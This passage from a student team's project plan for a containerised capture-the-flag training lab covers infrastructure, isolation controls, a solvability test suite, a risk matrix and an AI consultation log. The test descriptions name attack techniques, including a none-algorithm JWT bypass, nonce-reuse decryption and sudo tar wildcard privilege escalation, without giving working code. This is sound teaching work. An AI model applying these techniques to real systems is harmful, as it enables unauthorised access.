| Component Layer      | Technology / Software       | Purpose                                    |
+----------------------+-----------------------------+--------------------------------------------+
| Host OS              | Ubuntu Server 24.04 LTS     | Operating platform with kernel cgroups v2  |
| Container Engine     | Docker Engine 26.0 + Compose| Microservice isolation and orchestration   |
| Scoring Platform     | CTFd v3.7.0 (Python/Flask)  | Challenge tracking, submission & penalties |
| Cache & Datastore    | Redis 7 & MySQL 8.0         | Fast session handling & relational state   |
| Reverse Proxy        | Nginx 1.25 (Alpine)         | SSL termination, rate limiting & routing   |
| Stage 2 Web Stack    | Python 3.12, Flask, SQLite  | Vulnerable REST API & JWT middleware       |
| Stage 3 Artifacts    | tshark, Scapy, Wireshark    | Automated generation of realistic PCAPs    |
| Stage 4 Cryptography | Python 3, PyCryptodome      | Stream cipher verification routines        |
| Stage 5 Binary Stack | GCC (x86_64), GDB, Ghidra   | Vulnerable ELF binary compiler & debugger  |
| Stage 6 System Stack | Alpine / Debian 12 Minimal  | Linux system environment with custom sudo  |
+----------------------+-----------------------------+--------------------------------------------+
```

### 8.2 Estimated Resource Allocation

| Resource | Minimum Specification | Recommended Production Spec | Justification |
| :--- | :--- | :--- | :--- |
| **CPU** | 4 Virtual Cores (2.4 GHz) | 8 Virtual Cores (3.0 GHz) | Supports concurrent container processes, packet analysis generation, and multi-user CTFd load. |
| **RAM** | 8 GB DDR4 | 16 GB DDR4 | CTFd (1 GB), MySQL/Redis (1.5 GB), Web & Linux containers (2 GB), OS cache and buffers (3.5 GB). |
| **Storage** | 30 GB SSD (NVMe preferred) | 60 GB SSD | Accommodates Docker image layers, pcap files, logs, and container snapshots. |
| **Network** | 1 Gbps Virtual NIC | 1 Gbps with isolated VLAN | Prevents packet sniff leakage to university network; enables full speed pcap downloads. |

---

## 9. Deployment, Isolation & Security Controls Plan

To prevent unintended impact on institutional infrastructure and safeguard participants from mutual interference:

### 9.1 Container Isolation & Privilege Demotion
* **Drop Linux Capabilities**: All challenge containers drop unnecessary kernel capabilities:
  ```yaml
  cap_drop:
    - ALL
  cap_add:
    - NET_BIND_SERVICE
  ```
  Stage 6 specifically drops all capabilities except those strictly required for local setuid execution (`SETUID`, `SETGID`).
* **Non-Root Default Users**: Containers execute with low-privilege service accounts (`uid=1001:gid=1001`).
* **Read-Only Root Filesystems**: Containers run with `read_only: true` on root volumes, providing only temporary writable tmpfs mounts for `/tmp` and `/run`.

### 9.2 Network Segmentation
* Docker bridge `internal_bastion_net` is created with internal mode:
  ```bash
  docker network create --internal --subnet=172.20.0.0/24 internal_bastion_net
  ```
  The `--internal` flag prevents Docker from generating iptables NAT forwarding rules to external interfaces, completely blocking outbound WAN traffic from the core bastion.

### 9.3 Rate Limiting & Denial-of-Service Prevention
* Nginx implements connection rate limiting (`limit_req_zone $binary_remote_addr zone=api_limit:10m rate=10r/s;`) to prevent automated fuzzers (e.g., Turbo Intruder, Dirbuster) from exhausting server resources.
* Each container enforces memory and CPU limits (`mem_limit: 512m`, `cpus: 0.75`).

### 9.4 State Reset & Recovery Mechanisms
* An automated cron job executes every 30 minutes to purge temporary `/tmp` artifacts in the persistent containers.
* A reset webhook endpoint (`POST /api/v1/container/reset`) accessible through the CTFd admin dashboard enables instantaneous restarts (`docker compose restart <container_name>`) without interrupting the scoreboard.

---

## 10. Testing, Verification & Recovery Strategy

A comprehensive quality assurance regimen ensures that every stage is solvable, technically rigorous, free of unintended shortcuts, and resistant to state corruption:

```
+-----------------------------------------------------------------------------------------------+
|                               TESTING & VERIFICATION PIPELINE                                 |
+------------------------+----------------------------------------------------------------------+
| 1. Unit Testing        | Validate individual vulnerability logic (JWT parsing, sudoers syntax)|
| 2. Exploit Validation  | Execute reference Python solver scripts to verify flag solvability    |
| 3. Unintended Solves   | Conduct black-box fuzzing to identify accidental bypasses            |
| 4. Stress & Concurrency| Run Apache JMeter simulation with 50 concurrent virtual users        |
| 5. Disaster Recovery   | Test total container destruction & 60-second restoration from backup |
+------------------------+----------------------------------------------------------------------+
```

### 10.1 Automated Verification Harness
An end-to-end integration test suite written in Python (`test_solvability_pipeline.py`) validates that each stage can be programmatically solved from start to finish:
* `test_stage1_stego()`: Downloads image, parses EXIF, executes `steghide`, verifies extracted text checksum.
* `test_stage2_jwt_bypass()`: Sends `none`-algorithm JWT to `/api/v1/audit/system-logs`, asserts HTTP 200 and flag regex match.
* `test_stage3_pcap_extraction()`: Feeds `suspicious_traffic.pcapng` to `tshark`, reconstructs byte stream, verifies header.
* `test_stage4_crypto_attack()`: Runs Two-Time Pad XOR solver against encrypted files, asserts recovered key matches test expectation.
* `test_stage5_binary_patch()`: Emulates GDB memory read or static deobfuscation script, verifies output strings.
* `test_stage6_tar_exploit()`: Connects via SSH paramiko, creates checkpoint files, invokes sudo tar, asserts euid == 0.

### 10.2 Recovery & Health-Check Procedures
* **Docker Healthchecks**: Every container includes an embedded `HEALTHCHECK` directive:
  ```dockerfile
  HEALTHCHECK --interval=30s --timeout=5s --retries=3 \
    CMD curl -f http://localhost:8080/health || exit 1
  ```
* **Auto-healing**: Unhealthy containers are automatically restarted by the Docker daemon (`restart: unless-stopped`).

---

## 11. Four-Member Individual Contribution Matrix

To ensure balanced responsibility across the project lifecycle, the workload is distributed equally among all four team members with clear technical deliverables:

| Member & Role | Core Technical Responsibilities | Concrete Deliverables & Evidence | Estimated Effort |
| :--- | :--- | :--- | :--- |
| **Member 1**<br>*(Team Lead)*<br>Platform & Infrastructure Architect | • Orchestrate Docker Compose and multi-network topology (`dmz_net`, `internal_bastion_net`).<br>• Deploy and harden CTFd scoring platform, Redis, and MySQL datastores.<br>• Configure Nginx reverse proxy, SSL certificates, and firewall/cgroups limits.<br>• Produce platform architecture diagrams and infrastructure specification. | • `docker-compose.yml`<br>• Nginx configuration (`nginx.conf`)<br>• Network segmentation rules (`iptables.sh`)<br>• Architecture diagram source files | 25% |
| **Member 2**<br>Security Challenge Engineer A | • Design, implement, and validate **Stage 1 (OSINT/Stego)** and **Stage 2 (Web API/JWT)**.<br>• Synthesize realistic mock developer profiles and steganographic image artifacts.<br>• Code the vulnerable Flask authentication backend and SQLite database.<br>• Write challenge descriptions, solution guides, and progressive hint penalties. | • `team_summit_2026.jpg` artifact<br>• Python Flask Web Application (`app.py`, `models.py`)<br>• Stego payload injection scripts<br>• Stages 1 & 2 documentation | 25% |
| **Member 3**<br>Security Challenge Engineer B | • Design, implement, and validate **Stage 3 (Network PCAP)** and **Stage 4 (Applied Crypto)**.<br>• Script realistic DNS exfiltration traffic generator using Scapy.<br>• Implement AES-CTR stream cipher flaw with reused nonce script.<br>• Develop reference automated Python exploit solvers (`solve_stage3.py`, `solve_stage4.py`). | • `suspicious_traffic.pcapng`<br>• PCAP generator script (`dns_beacon_gen.py`)<br>• Two-Time Pad Python solver<br>• Stages 3 & 4 documentation | 25% |
| **Member 4**<br>Integration, Systems & QA Lead | • Design, implement, and validate **Stage 5 (Reverse Eng.)** and **Stage 6 (Linux PrivEsc)**.<br>• Write, obfuscate, and compile the C `raven_implant` ELF binary with anti-debugging.<br>• Configure the internal Bastion Linux container, Sudoers permissions, and port knocking daemon.<br>• Build the automated end-to-end testing pipeline and disaster recovery scripts. | • `raven_implant.c` & compiled binary<br>• Hardened Bastion Dockerfile & Sudoers config<br>• `test_solvability_pipeline.py`<br>• Risk analysis & technical report synthesis | 25% |

---

## 12. Risks, Dependencies & Limitations

```
+-----------------------------------------------------------------------------------------------+
|                                 RISK ASSESSMENT MATRIX                                        |
+----------------------------+-----------+----------+-------------------------------------------+
| Identified Technical Risk  | Likelihood| Severity | Implemented Mitigation Strategy           |
+----------------------------+-----------+----------+-------------------------------------------+
| 1. Container Escape / Host | Low       | High     | Drop ALL kernel caps; avoid privileged    |
|    Compromise              |           |          | flags; enforce user namespace remapping.  |
| 2. Accidental DoS from     | Moderate  | Moderate | Implement Nginx request rate-limiting and |
|    Aggressive Scanners     |           |          | strict container memory/CPU cgroups.      |
| 3. Unintended Challenge    | Moderate  | Moderate | Comprehensive black-box testing and strict|
|    Bypass / Shortcut       |           |          | permission lockdown on intermediate files.|
| 4. System State Corruption | High      | Moderate | Stateless container design; 30-min cron   |
|    by Inexperienced Users  |           |          | resets; instant webhook container reboot. |
| 5. Network Traffic Leaks   | Low       | High     | Use Docker `--internal` flag on bastion   |
|    to University LAN       |           |          | network to completely block host gateway. |
+----------------------------+-----------+----------+-------------------------------------------+
```

### Technical Dependencies
* **Docker Engine $\ge 24.0$ & Docker Compose v2**: Required for modern Compose file features and CPU/memory reservation parameters.
* **Virtualization Support (VT-x / AMD-V)**: Required if deployed on a virtualized hypervisor (VMware ESXi, Proxmox, or VirtualBox).
* **Python 3.10+ Runtime**: Essential for automated verification and test harness execution.

---

## 13. Conclusion & Next Implementation Milestones

This project initiation document provides a rigorous, fully justified, and comprehensive technical foundation for **Project AegisBreach: Operation Midnight Raven**. By structuring the CTF around an authentic cyber incident narrative, covering 5 diverse domains across 6 difficulty-progressed stages, and anchoring the architecture in a secure, containerized, multi-tier environment, the proposed design fulfills all criteria of the assignment brief and learning outcomes LO1, LO2, and LO3.

### Implementation Roadmap (Phase 2 Milestones)
* **Milestone 1 (Week 1–2)**: Finalize Docker Compose network scaffolding and CTFd theme customization.
* **Milestone 2 (Week 3–4)**: Complete challenge backend codebases (Flask web app, binary compilation, PCAP generation).
* **Milestone 3 (Week 5)**: Deploy challenges to staging environment and execute `test_solvability_pipeline.py`.
* **Milestone 4 (Week 6)**: Conduct peer pilot test session, fine-tune hint penalty point values, and finalize viva presentation slides.

---

## 14. References

1. OWASP Foundation. (2025). *OWASP Top 10: 2025 Web Application Security Risks*. Available at: https://owasp.org/www-project-top-ten/
2. NIST. (2023). *Special Publication 800-115: Technical Guide to Information Security Testing and Assessment*. National Institute of Standards and Technology.
3. GTFOBins Project. (2026). *Unix Binaries Exploitation Repository: Tar*. Available at: https://gtfobins.github.io/gtfobins/tar/
4. CTFd. (2026). *CTFd Open-Source Capture The Flag Platform Documentation*. Available at: https://docs.ctfd.io/
5. Ferguson, N., Schneier, B., & Kohno, T. (2010). *Cryptography Engineering: Design Principles and Practical Applications*. Wiley Publishing.
6. MITRE ATT&CK. (2026). *Technique T1071.004: Application Layer Protocol - DNS*. MITRE Corporation. Available at: https://attack.mitre.org/techniques/T1071/004/
7. Docker Inc. (2026). *Docker Documentation: Security and Resource Constraints*. Available at: https://docs.docker.com/engine/security/

---

## 15. Appendices: Generative AI Prompt Log

*(In compliance with module assignment guidelines requiring documented transparency when generative AI tools are consulted for scenario modeling and design refinement)*

### AI Consultation Record

* **AI Platform**: Google Antigravity / Gemini 3.8 Flash (Advanced Agentic Architecture)
* **Date & Time of Consultation**: 12/09/2026, 11:37 AM IST
* **Nature of Assistance**: Educational scenario brainstorming, structure alignment with university assessment criteria, technical difficulty progression modeling, and verification of Linux wildcard injection mechanics.

#### Prompt Log Entry 1: Scenario & Progression Synthesis
* **User Input Prompt**:
  > *"Analyze the CTF Play Box Implementation Project Initiation brief (LO1, LO2, LO3; minimum 6 stages, at least 4 domains, difficulty progression 1-2 Easy, 3-4 Moderate, 5 Mod-Hard, 6 Hard). Propose an immersive, cohesive enterprise breach narrative connecting all stages logically, selecting appropriate domains and real-world tools."*
* **AI Output Analysis & Utility**:
  The AI suggested an incident response investigation into an APT ("Midnight Raven") breaching a fintech firm ("Apex Digital Financials"), transitioning sequentially from OSINT/Stego to Web JWT bypass, DNS PCAP analysis, AES-CTR Two-Time Pad cryptanalysis, ELF binary reverse engineering, and Linux wildcard privilege escalation. This narrative was adopted because it provides a unified investigation rather than disconnected puzzles.

#### Prompt Log Entry 2: Platform Architecture & Security Isolation
* **User Input Prompt**:
  > *"Design a containerized network architecture diagram and isolation plan for this 6-stage CTF that prevents students from escaping containers or attacking the host/university network, while enabling realistic lateral movement."*
* **AI Output Analysis & Utility**:
  The AI recommended a dual Docker bridge network architecture (`dmz_net` and an internal `--internal` `internal_bastion_net` without default gateway routing), dropping unnecessary Linux capabilities (`cap_drop: ALL`), and enforcing Nginx reverse proxy rate-limiting. This formed the foundation of Section 7 and Section 9.

#### Prompt Log Entry 3: Rubric Compliance & Verification Strategy
* **User Input Prompt**:
  > *"Review the marking scheme (Concept 15m, Domain Coverage 15m, Stage Specifications 20m, Architecture 15m, Feasibility & Security 10m, LOs 5m, Documentation 5m, Contribution Matrix 10m, Testing 5m). Ensure all required specification fields for every stage and the 4-member breakdown are comprehensively detailed."*
* **AI Output Analysis & Utility**:
  The AI verified that each challenge specification table contains all 14 mandatory fields (Stage ID, Domain, Difficulty, Scenario, Learning Objective, Environment, Player Task, Flag Location/Logic, Tools, Dependencies, Expected Solution Path, Validation, Hints, Reset/Recovery) and structured the individual contribution matrix across Platform, Challenge Design A, Challenge Design B, and Integration/QA.
